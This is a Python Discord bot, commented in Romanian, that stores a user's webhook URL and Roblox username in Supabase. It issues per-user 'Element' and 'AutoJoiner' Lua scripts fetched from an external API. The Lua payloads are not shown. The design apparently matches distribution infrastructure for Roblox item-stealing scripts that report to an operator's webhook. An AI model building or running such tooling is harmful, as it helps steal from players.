import os
import uuid
import secrets
import requests
import discord
from discord.ext import commands
from supabase import create_client, Client

# ---------------------------
# CONFIG
# ---------------------------
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

# URL-ul API-ului tău pentru generarea scripturilor
API_URL = "https://your-api-railway-url.com/generate"  # Înlocuiește cu URL-ul tău

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

ELEMENT_URL = "https://element.up.railway.app/cdn/element.luau"
AUTOJOINER_URL = "https://element.up.railway.app/cdn/autojoiner.luau"

# ---------------------------
# INIT
# ---------------------------
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

# ---------------------------
# HELPERS
# ---------------------------
def generate_id():
    return str(uuid.uuid4())

def generate_key():
    return "ELEMENT$" + secrets.token_urlsafe(24)

def get_generated_script(discord_id, element_id, key=None):
    payload = {
        "discordId": discord_id,
        "id": element_id,
        "key": key  # poate fi None, API-ul trebuie să gestioneze
    }
    response = requests.post(API_URL, json=payload)
    if response.status_code == 200:
        data = response.json()
        return data.get("script")
    else:
        print(f"Error API: {response.status_code} - {response.text}")
        return None

# ---------------------------
# ON READY
# ---------------------------
@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"🔗 Synced {len(synced)} commands")
    except Exception as e:
        print(f"❌ Sync error: {e}")
    print(f"✅ Bot connected as {bot.user}")

# ---------------------------
# SET WEBHOOK
# ---------------------------
@bot.tree.command(name="setwebhook", description="Set your webhook URL")
async def setwebhook(interaction: discord.Interaction, webhook: str):
    user_id = str(interaction.user.id)

    supabase.table("users").upsert({
        "custom_id": user_id,
        "webhook_url": webhook
    }, on_conflict=["custom_id"]).execute()

    await interaction.response.send_message(
        f"✅ Webhook set `{webhook}`", ephemeral=True
    )

# ---------------------------
# SET USERNAME
# ---------------------------
@bot.tree.command(name="setusername", description="Set your Roblox username")
async def setusername(interaction: discord.Interaction, username: str):
    user_id = str(interaction.user.id)

    supabase.table("users").upsert({
        "custom_id": user_id,
        "username": username
    }, on_conflict=["custom_id"]).execute()

    await interaction.response.send_message(
        f"✅ Username set `{username}`", ephemeral=True
    )

# ---------------------------
# GENERATE ELEMENT SCRIPT
# ---------------------------
@bot.tree.command(name="generate", description="Generate your Element Script")
async def generate(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    # Obține informațiile utilizatorului
    user_data = supabase.table("users").select("username, webhook_url").eq("custom_id", user_id).execute()
    user_record = user_data.data[0] if user_data.data else None

    if not user_record:
        await interaction.response.send_message(
            "❌ Te rog să setezi webhook și username folosind `/setwebhook` și `/setusername`.", 
            ephemeral=True
        )
        return

    # Verifică dacă există deja elementul pentru utilizator
    existing = supabase.table("elements").select("id").eq("custom_id", user_id).execute()
    element_record = existing.data[0] if existing.data else None

    element_id = element_record["id"] if element_record else generate_id()

    # Salvează sau actualizează elementul
    supabase.table("elements").upsert({
        "custom_id": user_id,
        "id": element_id
    }, on_conflict=["custom_id"]).execute()

    webhook = user_record.get("webhook_url", "⚠️ Not set")
    username = user_record.get("username", "⚠️ Not set")

    # Apelează API-ul pentru a genera scriptul
    script = get_generated_script(user_id, element_id)

    if script:
        msg = (
            f"## Your Element Script\n"
            f"Webhook: `{webhook}`\n"
            f"Username: `{username}`\n\n"
            f"```lua\n"
            f'ID="{element_id}"\n'
            f'{script}\n'
            f"```"
        )
        await interaction.response.send_message(msg, ephemeral=True)
    else:
        await interaction.response.send_message(
            "Eroare la generarea scriptului.", ephemeral=True
        )

# ---------------------------
# GENERATE AUTOJOINER SCRIPT
# ---------------------------
@bot.tree.command(name="generate-autojoiner", description="Generate your AutoJoiner Script")
async def generate_autojoiner(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    # Verifică dacă există deja elementul și cheia
    existing = supabase.table("elements").select("id, key").eq("custom_id", user_id).execute()
    record = existing.data[0] if existing.data else None

    element_id = record["id"] if record and record.get("id") else generate_id()
    key = record["key"] if record and record.get("key") else generate_key()

    # Upsert element cu ID și KEY
    supabase.table("elements").upsert({
        "custom_id": user_id,
        "id": element_id,
        "key": key
    }, on_conflict=["custom_id"]).execute()

    # Apel API-ul pentru script
    script = get_generated_script(user_id, element_id, key)

    if script:
        msg = (
            f"## ⚠️ DON'T SHARE! THIS CONTAINS YOUR PRIVATE KEY! ⚠️\n\n"
            f"```lua\n"
            f'KEY="{key}"\n'
            f'{script}\n'
            f"```"
        )
        await interaction.response.send_message(msg, ephemeral=True)
    else:
        await interaction.response.send_message(
            "Eroare la generarea scriptului AutoJoiner.", ephemeral=True
        )

# ---------------------------
# RUN
# ---------------------------
bot.run(DISCORD_TOKEN)
